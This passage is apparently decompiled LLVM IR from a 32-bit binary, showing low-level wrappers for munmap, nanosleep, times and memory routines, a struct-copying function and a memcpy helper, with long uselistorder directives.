  %v2_805409a = inttoptr i32 %v1_8054093 to i32*
  store i32 %v1_8054098, i32* %v2_805409a, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_80540a2.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805409f

dec_label_pc_805409f:                             ; preds = %dec_label_pc_8054066, %dec_label_pc_8054093
  %v2_80540a2 = phi i32 [ %v0_8054067, %dec_label_pc_8054066 ], [ %v2_80540a2.pre, %dec_label_pc_8054093 ]
  %v0_805409f = phi i32 [ %v6_8054087, %dec_label_pc_8054066 ], [ -1, %dec_label_pc_8054093 ]
  store i32 %v2_80540a2, i32* @esi, align 4
  ret i32 %v0_805409f

; uselistorder directives
  uselistorder i32 %v0_805407f, { 1, 0 }
  uselistorder label %dec_label_pc_805409f, { 1, 0 }
}

define i32 @function_80540a5(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80540a5:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80540a5 = load i32, i32* @ebx, align 4
  store i32 %v0_80540a5, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_80540b8 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_80540b8, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_80540b8, -4095
  br i1 %tmp10, label %dec_label_pc_80540d1, label %dec_label_pc_80540c5

dec_label_pc_80540c5:                             ; preds = %dec_label_pc_80540a5
  %v1_80540c5 = call i32 @function_8051fb9(i32 %v0_80540a5)
  %v0_80540ca = load i32, i32* %ebx.global-to-local, align 4
  %v1_80540ca = sub i32 0, %v0_80540ca
  %v2_80540cc = inttoptr i32 %v1_80540c5 to i32*
  store i32 %v1_80540ca, i32* %v2_80540cc, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80540d5.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80540d1

dec_label_pc_80540d1:                             ; preds = %dec_label_pc_80540a5, %dec_label_pc_80540c5
  %v2_80540d5 = phi i32 [ %v0_80540a5, %dec_label_pc_80540a5 ], [ %v2_80540d5.pre, %dec_label_pc_80540c5 ]
  %v0_80540d1 = phi i32 [ %v3_80540b8, %dec_label_pc_80540a5 ], [ -1, %dec_label_pc_80540c5 ]
  %v2_80540d3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80540d3, i32* @edx, align 4
  store i32 %v2_80540d5, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80540d1

; uselistorder directives
  uselistorder i32 %v3_80540b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80540d1, { 1, 0 }
}

define i32 @function_80540d7(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80540d7:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80540d7 = load i32, i32* @ebx, align 4
  store i32 %v0_80540d7, i32* %stack_var_-4, align 4
  %v4_80540db = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_80540db, i32* %ebx.global-to-local, align 4
  %v6_80540ea = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_80540ea, i32* %ebx.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_80540ea, -4095
  br i1 %tmp11, label %dec_label_pc_8054103, label %dec_label_pc_80540f7

dec_label_pc_80540f7:                             ; preds = %dec_label_pc_80540d7
  %v1_80540f7 = call i32 @function_8051fb9(i32 %v0_80540d7)
  %v0_80540fc = load i32, i32* %ebx.global-to-local, align 4
  %v1_80540fc = sub i32 0, %v0_80540fc
  %v2_80540fe = inttoptr i32 %v1_80540f7 to i32*
  store i32 %v1_80540fc, i32* %v2_80540fe, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054107.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054103

dec_label_pc_8054103:                             ; preds = %dec_label_pc_80540d7, %dec_label_pc_80540f7
  %v2_8054107 = phi i32 [ %v0_80540d7, %dec_label_pc_80540d7 ], [ %v2_8054107.pre, %dec_label_pc_80540f7 ]
  %v0_8054103 = phi i32 [ %v6_80540ea, %dec_label_pc_80540d7 ], [ -1, %dec_label_pc_80540f7 ]
  %v2_8054105 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054105, i32* @edx, align 4
  store i32 %v2_8054107, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054103

; uselistorder directives
  uselistorder i32 %v6_80540ea, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054103, { 1, 0 }
}

define i32 @function_8054109(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054109:
  %stack_var_-12 = alloca i32, align 4
  %v0_805410a = load i32, i32* @ebx, align 4
  %v0_805410e = load i32, i32* @global_var_80561b8.241, align 8
  %v1_805410e = icmp eq i32 %v0_805410e, 0
  %v1_8054119 = icmp eq i1 %v1_805410e, false
  br i1 %v1_8054119, label %dec_label_pc_805412c, label %dec_label_pc_805411b

dec_label_pc_805411b:                             ; preds = %dec_label_pc_8054109
  %v1_8054120 = call i32 @function_80542cf(i32 0)
  %v2_8054128 = icmp slt i32 %v1_8054120, 0
  br i1 %v2_8054128, label %dec_label_pc_805414e, label %dec_label_pc_805411b.dec_label_pc_805412c_crit_edge

dec_label_pc_805411b.dec_label_pc_805412c_crit_edge: ; preds = %dec_label_pc_805411b
  %v0_805412e.pre = load i32, i32* @global_var_80561b8.241, align 8
  br label %dec_label_pc_805412c

dec_label_pc_805412c:                             ; preds = %dec_label_pc_805411b.dec_label_pc_805412c_crit_edge, %dec_label_pc_8054109
  %v0_805413c = phi i32 [ %v0_805412e.pre, %dec_label_pc_805411b.dec_label_pc_805412c_crit_edge ], [ %v0_805410e, %dec_label_pc_8054109 ]
  %v1_805412c = icmp eq i32 %arg1, 0
  %v1_8054133 = icmp eq i1 %v1_805412c, false
  br i1 %v1_8054133, label %dec_label_pc_8054139, label %dec_label_pc_8054135

dec_label_pc_8054135:                             ; preds = %dec_label_pc_805412c
  br label %dec_label_pc_8054151

dec_label_pc_8054139:                             ; preds = %dec_label_pc_805412c
  store i32 %v0_805413c, i32* @ebx, align 4
  %v2_805413e = add i32 %v0_805413c, %arg1
  %v1_8054142 = call i32 @function_80542cf(i32 %v2_805413e)
  %v2_805414a = icmp slt i32 %v1_8054142, 0
  %v1_805414c = icmp eq i1 %v2_805414a, false
  br i1 %v1_805414c, label %dec_label_pc_8054139.dec_label_pc_8054151_crit_edge, label %dec_label_pc_805414e

dec_label_pc_8054139.dec_label_pc_8054151_crit_edge: ; preds = %dec_label_pc_8054139
  %v0_8054151.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054151

dec_label_pc_805414e:                             ; preds = %dec_label_pc_8054139, %dec_label_pc_805411b
  br label %dec_label_pc_8054151

dec_label_pc_8054151:                             ; preds = %dec_label_pc_8054139.dec_label_pc_8054151_crit_edge, %dec_label_pc_8054135, %dec_label_pc_805414e
  %v0_8054151 = phi i32 [ %v0_8054151.pre, %dec_label_pc_8054139.dec_label_pc_8054151_crit_edge ], [ %v0_805413c, %dec_label_pc_8054135 ], [ -1, %dec_label_pc_805414e ]
  %v2_8054153 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054153, i32* @edx, align 4
  store i32 %v0_805410a, i32* @ebx, align 4
  ret i32 %v0_8054151

; uselistorder directives
  uselistorder i32 %v0_805413c, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_80542cf, { 1, 0 }
  uselistorder label %dec_label_pc_8054151, { 2, 0, 1 }
}

define i32 @function_8054157(%tms* %arg1) local_unnamed_addr {
dec_label_pc_8054157:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054157 = load i32, i32* @edi, align 4
  store i32 %v0_8054157, i32* %stack_var_-4, align 4
  %v4_805415b = ptrtoint %tms* %arg1 to i32
  store i32 %v4_805415b, i32* %edi.global-to-local, align 4
  %v0_805415f = load i32, i32* @ebx, align 4
  %v3_8054167 = call i32 @times(%tms* %arg1)
  store i32 %v3_8054167, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_8054167, -4095
  br i1 %tmp9, label %dec_label_pc_805417f, label %dec_label_pc_8054173

dec_label_pc_8054173:                             ; preds = %dec_label_pc_8054157
  %v1_8054173 = call i32 @function_8051fb9(i32 %v0_805415f)
  %v0_8054178 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054178 = sub i32 0, %v0_8054178
  %v2_805417a = inttoptr i32 %v1_8054173 to i32*
  store i32 %v1_8054178, i32* %v2_805417a, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8054183.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805417f

dec_label_pc_805417f:                             ; preds = %dec_label_pc_8054157, %dec_label_pc_8054173
  %v2_8054183 = phi i32 [ %v0_8054157, %dec_label_pc_8054157 ], [ %v2_8054183.pre, %dec_label_pc_8054173 ]
  %v0_805417f = phi i32 [ %v3_8054167, %dec_label_pc_8054157 ], [ -1, %dec_label_pc_8054173 ]
  store i32 %v2_8054183, i32* %edi.global-to-local, align 4
  ret i32 %v0_805417f

; uselistorder directives
  uselistorder i32 %v3_8054167, { 1, 0, 2 }
  uselistorder i32* @edi, { 13, 88, 89, 90, 91, 92, 147, 5, 148, 149, 150, 151, 1, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 6, 7, 8, 9, 10, 11, 12, 170, 184, 185, 171, 172, 173, 174, 175, 176, 177, 178, 2, 179, 180, 181, 182, 183, 186, 187, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 14, 106, 107, 188, 189, 108, 109, 110, 111, 15, 190, 191, 16, 192, 193, 194, 195, 112, 3, 113, 114, 23, 55, 56, 57, 58, 25, 26, 27, 28, 29, 49, 50, 51, 40, 41, 42, 43, 60, 61, 62, 44, 45, 46, 47, 37, 38, 39, 64, 65, 66, 59, 67, 68, 52, 17, 18, 19, 20, 21, 22, 63, 30, 24, 31, 32, 33, 34, 35, 36, 48, 53, 54, 69, 70, 71, 72, 73, 74, 0, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 86, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 146, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 4, 144, 145, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 218, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248 }
  uselistorder %tms* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805417f, { 1, 0 }
}

define i32 @function_8054185(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054185:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054186 = load i32, i32* @ebx, align 4
  store i32 %v0_8054186, i32* %stack_var_-8, align 4
  %v4_805418a = ptrtoint i16* %arg1 to i32
  store i32 %v4_805418a, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v3_8054197 = inttoptr i32 %arg2 to i8*
  %v4_8054197 = call i32 @function_805200a(i8* %v3_8054197, i32 0, i32 88)
  store i32 %v4_8054197, i32* %eax.global-to-local, align 4
  %v2_805419c = load i16, i16* %arg1, align 2
  %v3_805419c = zext i16 %v2_805419c to i32
  store i32 %v3_805419c, i32* %eax.global-to-local, align 4
  %v0_805419f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805419f = add i32 %v0_805419f, 4
  %v2_805419f = inttoptr i32 %v1_805419f to i32*
  store i32 0, i32* %v2_805419f, align 4
  %v0_80541a6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80541a6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541a6 = inttoptr i32 %v1_80541a6 to i32*
  store i32 %v0_80541a6, i32* %v2_80541a6, align 4
  %v0_80541a8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80541a8 = add i32 %v0_80541a8, 4
  %v2_80541a8 = inttoptr i32 %v1_80541a8 to i32*
  %v3_80541a8 = load i32, i32* %v2_80541a8, align 4
  store i32 %v3_80541a8, i32* %eax.global-to-local, align 4
  %v1_80541ab = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541ab = add i32 %v1_80541ab, 12
  %v3_80541ab = inttoptr i32 %v2_80541ab to i32*
  store i32 %v3_80541a8, i32* %v3_80541ab, align 4
  %v0_80541ae = load i32, i32* %esi.global-to-local, align 4
  %v1_80541ae = add i32 %v0_80541ae, 8
  %v2_80541ae = inttoptr i32 %v1_80541ae to i16*
  %v3_80541ae = load i16, i16* %v2_80541ae, align 2
  %v4_80541ae = zext i16 %v3_80541ae to i32
  store i32 %v4_80541ae, i32* %eax.global-to-local, align 4
  %v1_80541b2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541b2 = add i32 %v1_80541b2, 16
  %v3_80541b2 = inttoptr i32 %v2_80541b2 to i32*
  store i32 %v4_80541ae, i32* %v3_80541b2, align 4
  %v0_80541b5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80541b5 = add i32 %v0_80541b5, 10
  %v2_80541b5 = inttoptr i32 %v1_80541b5 to i16*
  %v3_80541b5 = load i16, i16* %v2_80541b5, align 2
  %v4_80541b5 = zext i16 %v3_80541b5 to i32
  store i32 %v4_80541b5, i32* %eax.global-to-local, align 4
  %v1_80541b9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541b9 = add i32 %v1_80541b9, 20
  %v3_80541b9 = inttoptr i32 %v2_80541b9 to i32*
  store i32 %v4_80541b5, i32* %v3_80541b9, align 4
  %v0_80541bc = load i32, i32* %esi.global-to-local, align 4
  %v1_80541bc = add i32 %v0_80541bc, 12
  %v2_80541bc = inttoptr i32 %v1_80541bc to i16*
  %v3_80541bc = load i16, i16* %v2_80541bc, align 2
  %v4_80541bc = zext i16 %v3_80541bc to i32
  store i32 %v4_80541bc, i32* %eax.global-to-local, align 4
  %v1_80541c0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541c0 = add i32 %v1_80541c0, 24
  %v3_80541c0 = inttoptr i32 %v2_80541c0 to i32*
  store i32 %v4_80541bc, i32* %v3_80541c0, align 4
  %v0_80541c3 = load i32, i32* %esi.global-to-local, align 4
  %v1_80541c3 = add i32 %v0_80541c3, 14
  %v2_80541c3 = inttoptr i32 %v1_80541c3 to i16*
  %v3_80541c3 = load i16, i16* %v2_80541c3, align 2
  %v4_80541c3 = zext i16 %v3_80541c3 to i32
  store i32 %v4_80541c3, i32* %eax.global-to-local, align 4
  %v1_80541c7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541c7 = add i32 %v1_80541c7, 28
  %v3_80541c7 = inttoptr i32 %v2_80541c7 to i32*
  store i32 %v4_80541c3, i32* %v3_80541c7, align 4
  %v0_80541ca = load i32, i32* %esi.global-to-local, align 4
  %v1_80541ca = add i32 %v0_80541ca, 16
  %v2_80541ca = inttoptr i32 %v1_80541ca to i16*
  %v3_80541ca = load i16, i16* %v2_80541ca, align 2
  %v4_80541ca = zext i16 %v3_80541ca to i32
  store i32 %v4_80541ca, i32* %eax.global-to-local, align 4
  %v0_80541ce = load i32, i32* %ebx.global-to-local, align 4
  %v1_80541ce = add i32 %v0_80541ce, 36
  %v2_80541ce = inttoptr i32 %v1_80541ce to i32*
  store i32 0, i32* %v2_80541ce, align 4
  %v0_80541d5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80541d5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541d5 = add i32 %v1_80541d5, 32
  %v3_80541d5 = inttoptr i32 %v2_80541d5 to i32*
  store i32 %v0_80541d5, i32* %v3_80541d5, align 4
  %v0_80541d8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80541d8 = add i32 %v0_80541d8, 20
  %v2_80541d8 = inttoptr i32 %v1_80541d8 to i32*
  %v3_80541d8 = load i32, i32* %v2_80541d8, align 4
  store i32 %v3_80541d8, i32* %eax.global-to-local, align 4
  %v1_80541db = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541db = add i32 %v1_80541db, 44
  %v3_80541db = inttoptr i32 %v2_80541db to i32*
  store i32 %v3_80541d8, i32* %v3_80541db, align 4
  %v0_80541de = load i32, i32* %esi.global-to-local, align 4
  %v1_80541de = add i32 %v0_80541de, 24
  %v2_80541de = inttoptr i32 %v1_80541de to i32*
  %v3_80541de = load i32, i32* %v2_80541de, align 4
  store i32 %v3_80541de, i32* %eax.global-to-local, align 4
  %v1_80541e1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541e1 = add i32 %v1_80541e1, 48
  %v3_80541e1 = inttoptr i32 %v2_80541e1 to i32*
  store i32 %v3_80541de, i32* %v3_80541e1, align 4
  %v0_80541e4 = load i32, i32* %esi.global-to-local, align 4
  %v1_80541e4 = add i32 %v0_80541e4, 28
  %v2_80541e4 = inttoptr i32 %v1_80541e4 to i32*
  %v3_80541e4 = load i32, i32* %v2_80541e4, align 4
  store i32 %v3_80541e4, i32* %eax.global-to-local, align 4
  %v1_80541e7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541e7 = add i32 %v1_80541e7, 52
  %v3_80541e7 = inttoptr i32 %v2_80541e7 to i32*
  store i32 %v3_80541e4, i32* %v3_80541e7, align 4
  %v0_80541ea = load i32, i32* %esi.global-to-local, align 4
  %v1_80541ea = add i32 %v0_80541ea, 32
  %v2_80541ea = inttoptr i32 %v1_80541ea to i32*
  %v3_80541ea = load i32, i32* %v2_80541ea, align 4
  store i32 %v3_80541ea, i32* %eax.global-to-local, align 4
  %v1_80541ed = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541ed = add i32 %v1_80541ed, 56
  %v3_80541ed = inttoptr i32 %v2_80541ed to i32*
  store i32 %v3_80541ea, i32* %v3_80541ed, align 4
  %v0_80541f0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80541f0 = add i32 %v0_80541f0, 40
  %v2_80541f0 = inttoptr i32 %v1_80541f0 to i32*
  %v3_80541f0 = load i32, i32* %v2_80541f0, align 4
  store i32 %v3_80541f0, i32* %eax.global-to-local, align 4
  %v1_80541f3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541f3 = add i32 %v1_80541f3, 64
  %v3_80541f3 = inttoptr i32 %v2_80541f3 to i32*
  store i32 %v3_80541f0, i32* %v3_80541f3, align 4
  %v0_80541f6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80541f6 = add i32 %v0_80541f6, 48
  %v2_80541f6 = inttoptr i32 %v1_80541f6 to i32*
  %v3_80541f6 = load i32, i32* %v2_80541f6, align 4
  store i32 %v3_80541f6, i32* %eax.global-to-local, align 4
  %v1_80541f9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541f9 = add i32 %v1_80541f9, 72
  %v3_80541f9 = inttoptr i32 %v2_80541f9 to i32*
  store i32 %v3_80541f6, i32* %v3_80541f9, align 4
  %v2_80541ff = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80541ff, i32* @ebx, align 4
  ret i32 %v3_80541f6

; uselistorder directives
  uselistorder i32 72, { 3, 2, 4, 5, 6, 7, 0, 8, 9, 10, 11, 1 }
  uselistorder i32 64, { 7, 6, 3, 2, 8, 9, 1, 4, 0, 5 }
  uselistorder i32 40, { 8, 6, 9, 1, 2, 0, 7, 4, 10, 3, 11, 12, 13, 14, 5 }
  uselistorder i32 56, { 6, 5, 0, 1, 2, 7, 8, 9, 10, 11, 3, 12, 13, 14, 4 }
  uselistorder i32 52, { 3, 2, 5, 6, 4, 1, 0 }
  uselistorder i32 48, { 8, 9, 7, 4, 6, 0, 3, 5, 1, 10, 11, 12, 13, 14, 2 }
  uselistorder i32 32, { 46, 47, 51, 33, 40, 52, 53, 48, 31, 41, 42, 54, 1, 0, 2, 3, 38, 4, 5, 6, 7, 8, 34, 55, 35, 39, 43, 10, 9, 12, 11, 13, 14, 37, 36, 44, 45, 49, 32, 50, 56, 15, 16, 17, 18, 57, 19, 20, 58, 59, 22, 21, 24, 23, 25, 26, 60, 27, 28, 61, 62, 63, 29, 30, 64 }
  uselistorder i32 36, { 6, 5, 0, 3, 1, 7, 8, 2, 9, 10, 11, 12, 4 }
  uselistorder i32 14, { 5, 1, 3, 0, 2, 10, 11, 6, 7, 8, 9, 4 }
  uselistorder i32 24, { 49, 50, 19, 20, 21, 57, 51, 52, 53, 7, 8, 1, 2, 14, 15, 27, 34, 9, 12, 39, 35, 22, 13, 23, 24, 25, 11, 26, 38, 16, 28, 10, 29, 30, 31, 0, 32, 33, 36, 37, 40, 41, 42, 43, 48, 44, 46, 47, 45, 54, 55, 56, 5, 17, 4, 3, 58, 18, 6 }
  uselistorder i32 20, { 27, 28, 8, 17, 18, 19, 40, 29, 30, 31, 32, 0, 1, 15, 23, 10, 13, 14, 20, 12, 21, 22, 11, 24, 16, 25, 26, 33, 34, 35, 2, 3, 36, 37, 38, 41, 39, 7, 5, 6, 4, 42, 43, 44, 9 }
  uselistorder i32 16, { 59, 60, 61, 62, 63, 64, 65, 66, 19, 47, 4, 67, 30, 95, 5, 48, 49, 50, 0, 6, 96, 97, 8, 7, 98, 1, 9, 68, 69, 20, 31, 46, 24, 33, 25, 34, 11, 12, 40, 51, 52, 41, 35, 38, 39, 37, 13, 36, 53, 54, 2, 42, 55, 26, 43, 56, 58, 21, 27, 28, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 44, 85, 22, 23, 86, 87, 88, 89, 90, 10, 29, 57, 91, 92, 93, 99, 94, 100, 104, 15, 105, 106, 107, 108, 109, 110, 111, 101, 102, 103, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 3, 122, 123, 124, 125, 126, 127, 128, 129, 18, 130, 16, 17, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 14, 153, 45, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 32 }
  uselistorder i32 8, { 110, 111, 112, 113, 114, 115, 116, 117, 118, 47, 124, 48, 125, 49, 90, 10, 127, 128, 129, 130, 131, 132, 133, 4, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 5, 93, 94, 95, 96, 97, 98, 99, 100, 144, 145, 146, 147, 148, 149, 56, 6, 57, 7, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 55, 167, 168, 8, 169, 170, 171, 172, 9, 173, 119, 120, 121, 122, 126, 51, 58, 52, 59, 53, 60, 174, 175, 176, 63, 102, 101, 64, 62, 11, 61, 103, 104, 91, 105, 106, 107, 108, 65, 109, 0, 12, 13, 123, 66, 67, 14, 68, 69, 15, 16, 70, 17, 1, 2, 177, 44, 178, 22, 23, 21, 28, 179, 20, 26, 27, 71, 54, 72, 73, 24, 74, 25, 75, 3, 18, 45, 180, 29, 76, 30, 77, 31, 32, 33, 34, 78, 35, 36, 37, 79, 38, 80, 181, 81, 39, 82, 40, 83, 182, 84, 41, 85, 42, 86, 87, 88, 43, 19, 183, 46, 184, 89, 92, 50 }
  uselistorder i32 (i8*, i32, i32)* @function_805200a, { 1, 5, 6, 7, 0, 2, 3, 4, 8 }
  uselistorder i32 88, { 0, 2, 1, 3 }
}

define i32 @function_8054202(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8054202:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054203 = load i32, i32* @esi, align 4
  store i32 %v0_8054203, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8054204 = sdiv i32 %sext, 16777216
  store i32 %v4_8054204, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805420e = ptrtoint i16* %arg1 to i32
  store i32 %v4_805420e, i32* %edi.global-to-local, align 4
  %v2_8054212 = udiv i32 %v4_8054204, 4
  %v3_8054215 = inttoptr i32 %arg2 to i8*
  %v4_8054215 = bitcast i16* %arg1 to i8*
  %v5_8054215 = call i8* @_memcpy(i8* %v4_8054215, i8* %v3_8054215, i32 %v2_8054212)
  %v0_8054217 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054217 = and i32 %v0_8054217, 2
  %v3_8054217 = icmp eq i32 %v2_8054217, 0
  br i1 %v3_8054217, label %dec_label_pc_805421d, label %dec_label_pc_805421b

dec_label_pc_805421b:                             ; preds = %dec_label_pc_8054202
  %v0_805421b = load i32, i32* %esi.global-to-local, align 4
  %v1_805421b = inttoptr i32 %v0_805421b to i16*
  %v2_805421b = load i16, i16* %v1_805421b, align 2
  %v3_805421b = load i32, i32* %edi.global-to-local, align 4
  %v4_805421b = inttoptr i32 %v3_805421b to i16*
  store i16 %v2_805421b, i16* %v4_805421b, align 2
  %v5_805421b = load i32, i32* %edi.global-to-local, align 4
  %v6_805421b = load i32, i32* %esi.global-to-local, align 4
  %v7_805421b = load i1, i1* @df, align 1
  %v8_805421b = select i1 %v7_805421b, i32 -2, i32 2
  %v9_805421b = add i32 %v8_805421b, %v5_805421b
  %v10_805421b = add i32 %v8_805421b, %v6_805421b
  store i32 %v9_805421b, i32* %edi.global-to-local, align 4
  store i32 %v10_805421b, i32* %esi.global-to-local, align 4
  %v0_805421d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805421d

dec_label_pc_805421d:                             ; preds = %dec_label_pc_8054202, %dec_label_pc_805421b
  %v0_805421d = phi i32 [ %v0_8054217, %dec_label_pc_8054202 ], [ %v0_805421d.pre, %dec_label_pc_805421b ]
  %v2_805421d = urem i32 %v0_805421d, 2
  %v3_805421d = icmp eq i32 %v2_805421d, 0
  br i1 %v3_805421d, label %dec_label_pc_8054222, label %dec_label_pc_8054221

dec_label_pc_8054221:                             ; preds = %dec_label_pc_805421d
  %v0_8054221 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054221 = inttoptr i32 %v0_8054221 to i8*
  %v2_8054221 = load i8, i8* %v1_8054221, align 1
  %v3_8054221 = load i32, i32* %edi.global-to-local, align 4
  %v4_8054221 = inttoptr i32 %v3_8054221 to i8*
  store i8 %v2_8054221, i8* %v4_8054221, align 1
  %v5_8054221 = load i32, i32* %edi.global-to-local, align 4
  %v6_8054221 = load i32, i32* %esi.global-to-local, align 4
  %v7_8054221 = load i1, i1* @df, align 1
  %v8_8054221 = select i1 %v7_8054221, i32 -1, i32 1
  %v9_8054221 = add i32 %v8_8054221, %v5_8054221
  %v10_8054221 = add i32 %v8_8054221, %v6_8054221
  store i32 %v9_8054221, i32* %edi.global-to-local, align 4
  store i32 %v10_8054221, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054222

dec_label_pc_8054222:                             ; preds = %dec_label_pc_805421d, %dec_label_pc_8054221
  store i32 %v4_805420e, i32* %eax.global-to-local, align 4
  %v2_8054226 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054226, i32* @esi, align 4
  ret i32 %v4_805420e

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 -2, { 19, 18, 20, 17, 21, 0, 1, 3, 4, 2, 7, 8, 6, 5, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 4, { 2, 165, 166, 167, 168, 169, 170, 220, 221, 223, 224, 225, 226, 227, 222, 50, 88, 228, 230, 231, 233, 236, 237, 238, 239, 240, 241, 3, 242, 243, 244, 245, 246, 247, 248, 249, 234, 235, 91, 53, 92, 93, 94, 95, 96, 97, 98, 4, 100, 99, 250, 5, 251, 52, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 9, 272, 273, 275, 274, 6, 232, 229, 101, 57, 171, 172, 173, 174, 175, 54, 58, 276, 277, 59, 108, 109, 134, 135, 60, 110, 136, 137, 138, 139, 111, 112, 113, 131, 132, 124, 125, 126, 142, 143, 144, 127, 128, 129, 121, 122, 123, 145, 146, 147, 102, 103, 104, 105, 106, 107, 114, 115, 116, 117, 118, 119, 120, 13, 130, 133, 89, 148, 149, 150, 151, 152, 153, 154, 156, 157, 155, 158, 140, 141, 164, 55, 61, 159, 56, 160, 161, 162, 163, 62, 51, 63, 176, 0, 177, 178, 179, 180, 181, 182, 14, 15, 183, 64, 184, 65, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 16, 66, 67, 197, 198, 199, 200, 201, 202, 203, 17, 204, 205, 206, 207, 18, 68, 208, 209, 210, 211, 19, 278, 279, 212, 213, 214, 215, 216, 217, 218, 219, 8, 280, 281, 282, 46, 24, 25, 23, 30, 22, 28, 29, 283, 